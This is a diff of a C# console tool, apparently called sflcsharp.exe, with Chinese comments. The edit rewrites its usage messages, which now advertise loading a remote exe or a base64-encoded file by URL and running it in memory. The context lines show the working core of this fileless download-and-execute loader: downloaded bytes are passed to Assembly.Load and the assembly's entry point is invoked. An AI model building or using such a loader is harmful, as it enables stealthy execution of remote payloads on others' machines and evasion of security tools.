@@ -24,7 +24,8 @@ namespace demo1
             }
             catch
             {
-                Console.WriteLine("\n参数输入有误，应该为sflcsharp.exe -b url");
+                Console.WriteLine("\n加载远程exe文件到内存执行：sflcsharp.exe -b exe文件的url");
+                Console.WriteLine("\n加载远程base64密文文件到内存执行：为sflcsharp.exe -b64 b64文件的url");
                 Environment.Exit(0);
             }
             if (filedownloadtype == "-b")
@@ -41,7 +42,7 @@ namespace demo1
                 Assembly assemblyinstance = Assembly.Load(filebuffer);  //将下载下来的程序加载到当前用户的内存中
                 Console.WriteLine("正在寻找程序入口点并执行程序");
                 assemblyinstance.EntryPoint.Invoke(null,new object[] { null}); //找到程序的入口点并执行程序
-                Console.WriteLine("程序执行完毕");
+                Console.WriteLine("\n程序执行完毕");
             }
         }
         public static byte[] Downloadbinarypefilebyhttp(string url)
